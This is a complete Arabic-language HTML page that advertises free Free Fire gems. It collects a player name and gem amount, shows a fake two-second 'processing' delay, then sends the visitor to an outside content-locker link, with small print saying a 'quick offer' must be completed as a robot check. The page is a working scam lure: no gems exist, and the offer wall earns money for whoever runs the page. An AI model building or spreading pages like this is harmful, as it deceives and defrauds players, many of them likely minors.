
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>شحن جواهر فري فاير مجاناً</title>
  <style>
    body {
      font-family: 'Arial', sans-serif;
      background: #121212;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      padding: 0 15px;
    }
    .container {
      background: #1f1f1f;
      border-radius: 15px;
      padding: 25px 30px;
      max-width: 400px;
      width: 100%;
      box-shadow: 0 0 15px rgba(255,255,255,0.1);
      text-align: center;
    }
    h1 {
      font-size: 24px;
      margin-bottom: 15px;
      color: #00e676;
    }
    label {
      display: block;
      margin: 15px 0 8px;
      text-align: right;
      font-weight: bold;
    }
    input[type="text"], select {
      width: 100%;
      padding: 10px;
      border-radius: 8px;
      border: none;
      font-size: 16px;
      margin-bottom: 15px;
    }
    button {
      background: #00e676;
      border: none;
      color: #000;
      padding: 12px 0;
      font-size: 18px;
      font-weight: bold;
      border-radius: 10px;
      cursor: pointer;
      width: 100%;
      transition: background 0.3s ease;
    }
    button:hover {
      background: #00c853;
    }
    small {
      display: block;
      margin-top: 10px;
      color: #aaa;
      font-size: 12px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>🔥 احصل على جواهر فري فاير مجاناً! 💎</h1>
    <p>ادخل اسم اللاعب واختر عدد الجواهر التي تريدها ثم اضغط ابدأ الشحن الآن.</p>
    <form id="gemForm" action="https://getafilenow.com/script_include.php?id=1808582" method="GET">
      <label for="playerName">اسم اللاعب في فري فاير:</label>
      <input type="text" id="playerName" name="playerName" required placeholder="اكتب اسمك داخل اللعبة" />
      
      <label for="gemAmount">اختر عدد الجواهر:</label>
      <select id="gemAmount" name="gemAmount" required>
        <option value="1000">1000 جوهرة</option>
        <option value="5000">5000 جوهرة</option>
        <option value="10000">10000 جوهرة</option>
      </select>
      
      <button type="submit">ابدأ الشحن الآن</button>
    </form>
    <small>لأسباب أمنية، ستحتاج لإكمال عرض سريع لتأكيد أنك لست روبوتًا.</small>
  </div>

  <script>
    document.getElementById("gemForm").addEventListener("submit", function(e) {
      e.preventDefault();
      const button = this.querySelector("button");
      button.disabled = true;
      button.textContent = "... جاري المعالجة";
      setTimeout(() => {
        this.submit();
      }, 2000);
    });
  </script>
</body>
</html>
